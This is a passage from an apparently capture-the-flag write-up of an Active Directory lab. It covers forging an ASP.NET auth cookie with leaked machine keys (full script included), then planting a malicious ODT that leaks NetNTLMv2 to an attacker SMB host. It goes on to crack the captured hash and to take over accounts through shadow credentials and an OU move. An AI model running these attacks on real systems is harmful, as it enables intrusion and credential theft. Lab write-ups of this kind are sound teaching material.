>>> validation_key = bytes.fromhex('EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80')
>>> cookie = bytes.fromhex('1BACEEC5BEFC8EACAE493D7F1D6DB34C0C23063318DBE04326A174842BF4D888B346D67CA79DA9ADF56AD95D28C336319B680D6B8AC494BF5E881F4C9B56611AD308D361DD39F08E2251C6C24B6C0D4D8A0C2A3C7BCA3B0344DF375EFDBC167C7CEBA6D1A37A86C3F16DC9A1EC5E1E6F04EB926B152D492D4E09256A42E73FF404484C1E3F94D560F9E6F3F5718A29A663FEF35D84CB4112CAF1657D0407FB0A')
```

The cookie is made up of a 16 byte IV, the ciphertext, and then a 32 byte HMAC:

```
byte:  0        16                    -32        end
       ├─ IV ───┼──────── CT ──────────┼── HMAC ──┤
       │  16 B  │         ? B          │   32 B   │
       └──────── signed = data[:-32] ──┘└ data[-32:]
```

I’ll get that into variables in Python:

```
>>> signed_data, mac = cookie[:-32], cookie[-32:]
```

Now I can validate the signature:

```
>>> hmac.compare_digest(mac, hmac.new(validation_key, signed_data, hashlib.sha256).digest())
True
```

The key material works, and I have the right algorithm! The HMAC is the keyed hash of that signed data.

#### Cookie Decrypt

I’m done with the HMAC at this point. Now to decrypt the ciphertext. I’ll bring in the `decryptionKey`, split the IV and the ciphertext, and decrypt:

```rust
>>> decryption_key = bytes.fromhex('B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581')
>>> iv, ct = signed_data[:16], signed_data[16:]
>>> plain = unpad(AES.new(decryption_key, AES.MODE_CBC, iv).decrypt(ct), 16)
>>> plain
b"\xb3J\x91K\\\x13o\xcf\xc4{\xb4|\x13\xc0U|\x01\x01\xf9\x91p\xb0\x91\x13\xdf\x08\xfe\xf9M\x11\x16\x93\x13\xdf\x08\x00\x05k\x00e\x00n\x00.\x00w\x00\tW\x00e\x00b\x00 \x00U\x00s\x00e\x00r\x00s\x00\x01/\x00\xff~\t\x89B\xbc\x1c\xd8\xfd,\xec$\x8d\xcd\xa4\x8df\x86?\xa8\xca\xd6'oI9\xfd\x1fh#\x94H\x94"
```

The plaintext isn’t actual text. It’s 16 bytes of random, the ticket, and then another 32 byte HMAC:

```
byte:  0         16                      -32        end
       ├─random ──┼─────── Ticket ─────────┼── HMAC ──┤
       │  16 B    │         ? B            │   32 B   │
       └───────────────────────────────────┘└─────────┘
```

The inner signature is valid:

```
>>> ticket = plain[16:-32]
>>> hmac.compare_digest(plain[-32:], hmac.new(validation_key, ticket, hashlib.sha256).digest())
True
```

Decoding the ticket is a bit more complex, but Claude will write up the instructions for it very quickly. It looks like this:

```
       ┌────┬─────┬──────────┬────┬──────────┬──────┐
field: │ 01 │ ver │  issued  │ FE │ expires  │ pers │
size:  │ 1B │  1B │ 8B ticks │ 1B │ 8B ticks │  1B  │
       └────┴─────┴──────────┴────┴──────────┴──────┘
       └────────── fixed 20-byte header ────────────┘
       ┌───────┬──────────┬────────┬────┐
field: │  name │ userData │  path  │ FF │
size:  │ 1B+2n │  1B+2n   │ 1B+2n  │ 1B │
       └───────┴──────────┴────────┴────┘
       
       Strings are 1 byte + len(UTF-16)
```

Each of the fields in the back has a single byte number of 16-bit characters, followed by that data in UTF-16LE, until the 0xFF at the end.

I’ll verify the single byte fixed values:

```
>>> ticket[0], ticket[1], ticket[10], ticket[-1]
(1, 1, 254, 255)
```

To decode the `issued` time, I’ll use `struct` to get the tenths of microseconds (100-nanoseconds) since 1 Jan 0001:

```
>>> import struct
>>> ticks = struct.unpack_from('<q', ticket, 2)[0]
>>> ticks
639251188561252857
```

I’ll make a helper function to translate:

```python
>>> from datetime import datetime, timedelta
>>> def ticks_to_date(ticks):
...     return str(datetime(1,1,1) + timedelta(microseconds=ticks // 10))
...
>>> ticks_to_date(ticks)
'2026-09-16 01:27:36.125285'
```

I can get the expires time as well:

```
>>> expires_ticks = struct.unpack_from('<q', ticket, 11)[0]
>>> ticks_to_date(expires_ticks)
'2026-09-16 01:37:36.125285'
```

So the cookie is valid for 10 minutes.

To get the variable-length strings, I’ll make another function:

```python
>>> def ticket_to_str(ticket, offset):
...     strlen = ticket[offset] * 2
...     return ticket[offset + 1:offset + 1 + strlen].decode('utf-16-le'), offset + strlen + 1
...    
```

This takes in the ticket and an offset, and returns the string and the offset of the next item.

```python
>>> ticket_to_str(ticket, 20)
('ken.w', 31)
>>> ticket_to_str(ticket, 31)
('Web Users', 50)
>>> ticket_to_str(ticket, 50)
('/', 53)
>>> ticket[53]
255
```

All in all, the cookie breaks down like:

```
off  size  bytes                      meaning
────────────────────────────────────────────────────────────────────
  0     1  01                         serialization format version
  1     1  01                         ticket version
  2     8  f9 91 70 b0 91 13 df 08    issued   2026-09-16 01:27:36
 10     1  fe                         spacer
 11     8  f9 4d 11 16 93 13 df 08    expires  2026-09-16 01:37:36
 19     1  00                         isPersistent = False
 20     1  05                         len(name) = 5 chars
 21    10  6b00 6500 6e00 2e00 7700   "ken.w"
 31     1  09                         len(userData) = 9 chars
 32    18  5700 6500 6200 2000 5500   "Web Users"
           7300 6500 7200 7300
 50     1  01                         len(cookiePath) = 1 char
 51     2  2f00                       "/"
 53     1  ff                         footer
────────────────────────────────────────────────────────────────────
                                      total = 54 bytes
```

#### Cookie Forge

The app is reading roles out of the ticket’s `userData` field, which held “Web Users” in my cookie and is what the upload handler checks with `User.IsInRole`. I want to create a cookie that has “Web Administrators” in that field so that I can get access to file uploads (under the thinking that someone on the box may be opening them).

I’ll write a Python script that basically does what I just did above but in reverse. Start with headers, imports, keys, and two helper functions:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "pycryptodome",
# ]
# ///
import hashlib
import hmac
import struct
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


validation_key = bytes.fromhex('EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80')
decryption_key = bytes.fromhex('B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581')

def make_string(s: str) -> bytes:
    enc_str = s.encode('utf-16-le')
    return bytes([len(s)]) + enc_str


def datetime_to_bytes(d: timedelta) -> bytes:
    ticks = int(d.total_seconds() * 10000000)
    return struct.pack('<q', ticks)
```

Now I’ll make the ticket:

```python
# Generate Ticket
#       ┌────┬─────┬──────────┬────┬──────────┬──────┬───────┬──────────┬───────┬────┐
#field: │ 01 │ ver │  issued  │ FE │ expires  │ pers │  name │ userData │  path │ FF │
#size:  │ 1B │  1B │ 8B ticks │ 1B │ 8B ticks │  1B  │ 1B+2n │  1B+2n   │ 1B+2n │ 1B │
#       └────┴─────┴──────────┴────┴──────────┴──────┴───────┴──────────┴───────┴────┘
#        └────────── fixed 20-byte header ──────────┘└ 1-byte char count + UTF-16LE ┘

EPOCH = datetime(1,1,1)
issued = datetime_to_bytes(datetime.now() - EPOCH)
expires = datetime_to_bytes(datetime.now() - EPOCH + timedelta(days=30))
persistent = bytes([1])
name = make_string('ken.w')
user_data = make_string('Web Administrators')
path = make_string('/')

ticket = b'\x01\x01'
ticket += issued
ticket += b'\xfe'
ticket += expires
ticket += persistent
ticket += name
ticket += user_data
ticket += path
ticket += b'\xff'
```

Next turn that into the plaintext payload:

```python
# make plaintext payload
# byte:  0         16                      -32        end
#      ├─random ──┼─────── Ticket ─────────┼── HMAC ──┤
#      │  16 B    │         ? B            │   32 B   │
#      └───────────────────────────────────┘└─────────┘
 
prefix = b"\xdf" * 16 # random bytes
inner_hmac = hmac.new(validation_key, ticket, hashlib.sha256).digest()
plaintext = prefix + ticket + inner_hmac
```

And now encrypt it:

```python
iv = bytes(list(range(16)))
enc = AES.new(decryption_key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
outer_hmac = hmac.new(validation_key, iv + enc, hashlib.sha256).digest()
cookie = (iv + enc + outer_hmac).hex().upper()

print(cookie)
```

Running this prints a big hex blob:

```
oxdf@hacky$ uv run forge_cookie.py 
000102030405060708090A0B0C0D0E0FE36991021AAAAF02148CE17C0335A600206B1EA8BD3BB1E8906EBF3F91FF4708769D4B75477210EFA354A191983DCB59F4BAD865D708C841E5A52791DFE70C2956E2AF0D45EDFDFD31A238A7E3BE788E3BF5B6E23F448546AF1900755E933256539191A0D54BE40521A175C9D6F19E1AA653E6372E22D597F1807896D297A8168825A886149F113CBE74D34EE97B77836EDB962B5C9EDBBAC2222C02B884858B
```

I’ll add that as the `.ASPXAUTH` cookie in Firefox dev tools, and refresh, and I’m still logged in as ken.w.

### Web Administrators Site Enumeration

The mail in the mailbox is different as the Web Administrators role:

![image-20260916193251024](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7ee1f29a8f8adc76.png)

![image-20260916193251024](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916193251024.webp)

(This is very weird and doesn’t make any sense, but I’ll go with it.) “Security Audit” says:

![image-20260916193342853](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/982f3d4aeb3ede66.png)

![image-20260916193342853](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916193342853.webp)

This explains why the upload functionality doesn’t work except for admins, and why NTLM is disabled.

The other email is from Johnathan asking for a password reset:

![image-20260916193459997](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eb261d8353584bab.png)

![image-20260916193459997](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916193459997.webp)

In the form, when I try to upload a PDF file, instead of showing “File Upload not permitted”, it shows:

![image-20260916150852125](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0294f4d881cf0467.png)

![image-20260916150852125](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916150852125.webp)

When I rename that PDF to `.docx`, it is accepted:

![image-20260916150936509](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6fb4e0e3808755a9.png)

![image-20260916150936509](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916150936509.webp)

### NTLMv2 Capture

#### docx Failure

I’m going to need a malicious document. I could try macros, but they aren’t typically enabled by default and there’s been no hint to that. My first attempt was to try [ntlm_theft](https://github.com/Greenwolf/ntlm_theft):

```
oxdf@hacky$ uv run ntlm_theft.py -g docx -s 10.10.15.169 -f 0xdf
Created: 0xdf/0xdf-(includepicture).docx (OPEN)
Created: 0xdf/0xdf-(remotetemplate).docx (OPEN)
Created: 0xdf/0xdf-(frameset).docx (OPEN)
Generation Complete.    
```

I’ll try uploading each of these, but they all fail. Given how hard it is to get a Microsoft Office license, there’s probably no Office on this machine to open them. I’ll confirm this in [Beyond Root](#beyond-root).

#### odt Success

Metasploit has a nice tool to create malicious ODT files:

```bash
msf > use auxiliary/fileformat/odt_badodt
msf auxiliary(fileformat/odt_badodt) > set LHOST 10.10.15.169
LHOST => 10.10.15.169
msf auxiliary(fileformat/odt_badodt) > run
[*] Generating Malicious ODT File 
[*] SMB Listener Address will be set to 10.10.15.169
[+] bad.odt stored at /root/.msf4/local/bad.odt
[*] Auxiliary module execution completed
```

If I rename `bad.odt` to `bad.zip` and unzip it, I get a few files:

```
oxdf@hacky$ ls
bad.zip  content.xml  manifest.rdf  META-INF  meta.xml  settings.xml  styles.xml  Thumbnails
```

`content.xml` has this line:

```xml
<draw:object xlink:href="file://10.10.15.169/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Basically it’s embedding an image at the path `file://<my ip>/test.jpg`. By making this a `file://` instead of `http://`, it will have Windows try to connect over SMB. Disabling NTLM on the domain stops the DC from accepting NTLM for inbound auth, but it doesn’t stop the host from offering NetNTLMv2 outbound to my SMB server, and that response is still crackable offline. I’ll start [Responder](https://github.com/lgandx/Responder) and upload this file to Hercules, and within a minute, I get a hit:

```haskell
oxdf@hacky$ sudo python Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
...[snip]...
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.242.196
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:1122334455667788:A1FEB7B590184A9A5A43D65A25E89980:0101000000000000805BFABA3A46DD011B3EBEA50BA3A9EF000000000200080049005A005000550001001E00570049004E002D0056004A004A0044004C0051004300390058003400310004003400570049004E002D0056004A004A0044004C005100430039005800340031002E0049005A00500055002E004C004F00430041004C000300140049005A00500055002E004C004F00430041004C000500140049005A00500055002E004C004F00430041004C0007000800805BFABA3A46DD010600040002000000080030003000000000000000000000000020000050255B9E274206600A97CE05603C237C87E5C635E5070113EC0AEEE4F341AA100A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100360039000000000000000000
...[snip]...
```

### Crack

I’ll save that challenge response to a file and pass it to `hashcat`:

```python
$ hashcat natalie.a.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:
                                                                  
5600 | NetNTLMv2 | Network Protocol
...[snip]...

NATALIE.A::HERCULES:1122334455667788:a1feb7b590184a9a5a43d65a25e89980:0101000000000000805bfaba3a46dd011b3ebea50ba3a9ef000000000200080049005a005000550001001e00570049004e002d0056004a004a0044004c0051004300390058003400310004003400570049004e002d0056004a004a0044004c005100430039005800340031002e0049005a00500055002e004c004f00430041004c000300140049005a00500055002e004c004f00430041004c000500140049005a00500055002e004c004f00430041004c0007000800805bfaba3a46dd010600040002000000080030003000000000000000000000000020000050255b9e274206600a97ce05603c237c87e5c635e5070113ec0aeee4f341aa100a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100360039000000000000000000:Prettyprincess123!
...[snip]...
Started: Wed Sep 16 21:53:55 2026
Stopped: Wed Sep 16 21:54:03 2026
```

It cracks almost instantly.

### Auth

The password works over SMB and LDAP:

```css
oxdf@hacky$ netexec smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:Prettyprincess123! 
oxdf@hacky$ netexec ldap dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\natalie.a:Prettyprincess123!
```

`netexec` doesn’t handle Kerberos over WinRM, so I can’t check that way. I don’t expect it to work regardless, as BloodHound doesn’t show natalie.a in a group that would have WinRM access.

## Auth as bob.w

### Enumeration

#### SMB

natalie.a has access to the shares that I haven’t been able to access so far:

```sql
oxdf@hacky$ netexec smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --shares
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:Prettyprincess123! 
SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
SMB         dc.hercules.htb 445    dc               Share           Permissions            Remark
SMB         dc.hercules.htb 445    dc               -----           -----------            ------
SMB         dc.hercules.htb 445    dc               ADMIN$                                 Remote Admin
SMB         dc.hercules.htb 445    dc               C$                                     Default share
SMB         dc.hercules.htb 445    dc               Department      READ                   
SMB         dc.hercules.htb 445    dc               IPC$            READ                   Remote IPC
SMB         dc.hercules.htb 445    dc               NETLOGON        READ                   Logon server share 
SMB         dc.hercules.htb 445    dc               Reports         READ,WRITE             
SMB         dc.hercules.htb 445    dc               SYSVOL          READ                   Logon server share 
SMB         dc.hercules.htb 445    dc               Users           READ 
```

I’ll connect with `smbclient.py`:

```sql
oxdf@hacky$ smbclient.py hercules.htb/natalie.a:'Prettyprincess123!'@dc.hercules.htb -k
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# use department
# ls
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 01:45:11 2024 ..
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Engineering Department
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 IT
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Recruitment
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Security Department
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Web Department
```

Each department has a folder. Each is empty (or at least appears empty to natalie.a) except for `IT`:

```yaml
# cd IT
# ls
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 ..
-rw-rw-rw-       1048  Wed Dec  4 01:45:12 2024 cleanup.lnk
-rw-rw-rw-        935  Wed Dec  4 01:47:11 2024 notice.eml
```

I’ll grab both:

```
# get notice.eml
# get cleanup.lnk
```

The `Reports` share has the reports I’ve uploaded:

```yaml
# ls
drw-rw-rw-          0  Thu Sep 17 01:45:31 2026 .
drw-rw-rw-          0  Thu Oct  9 14:56:58 2025 ..
-rw-rw-rw-         97  Thu Sep 17 01:45:07 2026 .~lock.413d6143-166e-4558-bf9b-c3e665b489cd.odt#
-rw-rw-rw-         97  Wed Sep 16 23:49:07 2026 .~lock.c53e7776-a30b-4095-8950-79bd9b061ff1.odt#
-rw-rw-rw-      37637  Wed Sep 16 23:59:07 2026 01817013-2111-47d3-8af0-3eaa88f931a5.docx
-rw-rw-rw-      44136  Wed Sep 16 19:08:56 2026 17c03353-42b1-4922-b461-633d2c6b677b.docx
-rw-rw-rw-      36667  Wed Sep 16 23:40:04 2026 712acb3c-479d-4d75-9c4f-425e4ffe9f77.docx
-rw-rw-rw-      37058  Wed Sep 16 23:39:11 2026 7cbc344c-1510-4c78-a7be-cff8234097b7.docx
-rw-rw-rw-      10218  Thu Sep 17 00:26:12 2026 8a049229-238d-44cd-a925-eed9baa71cb2.docx
-rw-rw-rw-       1881  Wed Sep 16 23:36:42 2026 a0425f09-072e-4172-9b05-dddd8d58fda8.docx
-rw-rw-rw-      37061  Wed Sep 16 23:38:35 2026 d42a9d80-a375-4bdd-bfa1-cdfb139058a4.docx
-rw-rw-rw-      26285  Thu Sep 17 00:23:46 2026 ebde4623-6a61-4cac-86ad-473a88980593.docx
-rw-rw-rw-      10224  Thu Sep 17 00:30:59 2026 ff8750e5-7ec1-4abb-a6fc-81cbd34b8b52.docx
```

I suspect the two lock files are left over from my exploits. No `.odt` files remain, just their lock files, so something is opening those and cleaning them up, while the `.docx` files sit untouched. That suggests the author / HTB didn’t consider that people might upload `.docx` files, which is a bit weird since that’s one of the two file types that are allowed.

`notice.eml` has a message from Ashley Browne to IT Support:

```sql
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues=
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

It has to do with password resets, and suggests that there are additional AD permissions for this group, and that the link points to a script to help. The `.lnk` points to `aCleanup.ps1` on ashley.b’s `Desktop` (which is a weird place to store scripts used in company processes):

```sql
oxdf@hacky$ file cleanup.lnk 
cleanup.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Unicoded, MachineID dc KnownFolderID 0762D272-C50A-4BB0-A382-697DCD729B80, Archive, ctime=Wed Dec  4 01:45:08 2024, atime=Wed Dec  4 01:45:08 2024, mtime=Wed Dec  4 01:45:08 2024, length=102, window=normal, IDListSize 0x01bd, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Users\ashley.b\Desktop\aCleanup.ps1"
```

#### LDAP / BloodHound

BloodHound data shows that natalie.a is a member of the Web Support group:

![image-20260916220323769](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/872f7da361187c9b.png)

![image-20260916220323769](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260916220323769.webp)

The Web Support group has `GenericWrite` over six users and the Web Department OU. But there’s nothing obvious from here. None of those users has any obvious outbound control, and they seem to be members of basically the same groups, except bob.w, who is also in the Recruitment Managers group:

![image-20260917070342010](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f35efd3f18af8fa1.png)

![image-20260917070342010](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260917070342010.webp)

### Shadow Credential

I’ll use the `GenericWrite` permission to add a shadow credential to bob.w’s account:

```sql
oxdf@hacky$ certipy shadow auto -k -u natalie.a@hercules.htb -p 'Prettyprincess123!' -target dc.hercules.htb -dc-ip 10.129.242.196 -account bob.w
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '508b761cb4a74d26a0c1c6c6c1cffb83'
[*] Adding Key Credential with device ID '508b761cb4a74d26a0c1c6c6c1cffb83' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID '508b761cb4a74d26a0c1c6c6c1cffb83' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

This returns an NT hash as well as a Kerberos ticket for bob. NTLM isn’t useful on this domain, but I can authenticate with the ticket:

```sql
oxdf@hacky$ KRB5CCNAME=bob.w.ccache netexec smb dc.hercules.htb -u bob.w --use-kcache 
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\bob.w from ccache
```

## Shell as auditor

### Enumeration

I’ve seen cases before where BloodHound doesn’t show all the ACLs that might be interesting. In [HTB: Haze](https://0xdf.gitlab.io/2025/06/28/htb-haze.html#acl-identification-shortcuts) I learned how `bloodyAD` has a `get writable` command, which proves useful here:

```yaml
oxdf@hacky$ KRB5CCNAME=bob.w.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u bob.w -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
permission: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Vincent Gray,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Nate Hicks,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Mark Stone,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Elijah Morrison,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Angelo Onclarit,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: DC=_msdcs.hercules.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hercules,DC=htb
permission: CREATE_CHILD
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

bob.w has:

-   `CREATE_CHILD` and `WRITE` on the Engineering Department, Security Department, and Web Department OUs.
-   `WRITE` on 21 user objects spread across those same three OUs (eight in Engineering, seven in Security, six in Web).
-   `CREATE_CHILD` on the `_msdcs.hercules.htb` DNS zone.

One of the 21 accounts in the list, auditor, is also in the Remote Management Users group. That seems like a good target.

To see what exactly is writable, I’ll add the `--detail` flag to `get writable`. The output is long, but the auditor section looks the same as it does for all the users on this list:

```
distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE 
```

bob.w can write the `name` and `cn` fields.

### Takeover

#### Strategy

I have write access to the `name` and `cn` fields on auditor, as well as `CREATE_CHILD` on the Web Department OU. That should allow me to move the user into that OU.

I already have control over natalie.a, who, as a member of Web Support, has `GenericWrite` over every user in the Web Department OU:

![image-20260917083904299](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8f3cdfacbd8ba91f.png)

![image-20260917083904299](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260917083904299.webp)

So I’ll move auditor into that OU, and then see if that `GenericWrite` applies.

#### Move OU

I’ll use [powerview.py](https://github.com/aniqfakhrul/powerview.py) (`uv tool install git+https://github.com/aniqfakhrul/powerview.py`) to make the change as `bloodyAD` doesn’t have it. Running it connects to an LDAP shell:

```swift
oxdf@hacky$ KRB5CCNAME=bob.w.ccache powerview  hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --no-pass
Logging directory is set to /home/oxdf/.powerview/logs/hercules
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─ ❯ 
```

Now I move auditor to the Web Department OU:

```
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─ ❯ Set-DomainObjectDN -Identity auditor -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
[2026-09-17 12:33:43] [Set-DomainObject] Success! modified new dn for CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

#### Shadow Credential

Now just like with bob.w, I’ll create a shadow credential on the auditor account:

```sql
oxdf@hacky$ certipy shadow auto -k -u natalie.a@hercules.htb -p 'Prettyprincess123!' -target dc.hercules.htb -dc-ip 10.129.242.196 -account auditor
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'auditor'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
